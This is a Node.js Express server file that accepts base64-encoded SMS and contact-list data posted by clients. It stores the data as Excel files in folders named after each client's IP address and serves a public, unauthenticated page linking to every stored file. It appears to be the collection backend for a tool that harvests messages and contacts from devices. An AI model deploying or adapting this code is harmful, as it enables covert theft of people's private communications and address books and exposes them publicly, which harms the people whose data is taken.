const express = require('express')
const path = require('path')
const bodyParser = require('body-parser')
const json2xls = require('json2xls')
const fs = require('fs')
const PORT = process.env.PORT || 5000

//获取当前用户的IP
let getClientIp = function (req) {
  return req.headers['x-forwarded-for'] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      req.connection.socket.remoteAddress || '';
};
var txtSms = ""
var txtContact = ""

express()
  .use(bodyParser.urlencoded({extended: true}))
  .use(bodyParser.json())
  .use(express.static(path.join(__dirname, 'public')))
  .get('/', function (req, res) {
    var path = './public'
     var pa = fs.readdirSync(path);
    var str = ''
    pa.forEach(function(ele,index){
      var info = fs.statSync(path+"/"+ele)	
      if(info.isDirectory()){
        str += "dir: "+ele + '<br>'
        var pb = fs.readdirSync(path+"/"+ele)
        pb.forEach(function(elc,index){
          str += "------file: <a href='./public/"+ele+"/"+elc+"'>"+elc + '</a><br>'
        })
      }
    })
     res.send(str);
  })
  .post('/', function (req, res){
   
    let ip = getClientIp(req).match(/\d+.\d+.\d+.\d+/);
    const dir = './public/'+ip;
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir)
    }
     if(req.body.sms!=undefined){
       txtSms = JSON.parse(Buffer.from(req.body.sms, 'base64').toString())
       xlsSms = json2xls(txtSms)
        fs.writeFileSync(dir+'/sms.xlsx',xlsSms,'binary')
     }
     if(req.body.contact!=undefined){
       txtContact = JSON.parse(Buffer.from(req.body.contact, 'base64').toString())
       xlsContact = json2xls(txtContact)
       fs.writeFileSync(dir+'/contact.xlsx',xlsContact,'binary')
     }
    
    
    res.send(ip+' ok');
  })
  // .set('views', path.join(__dirname, 'views'))
  // .set('view engine', 'ejs')
  // .get('/', (req, res) => res.render('pages/index'))
  .listen(PORT, () => console.log(`Listening on ${ PORT }`))
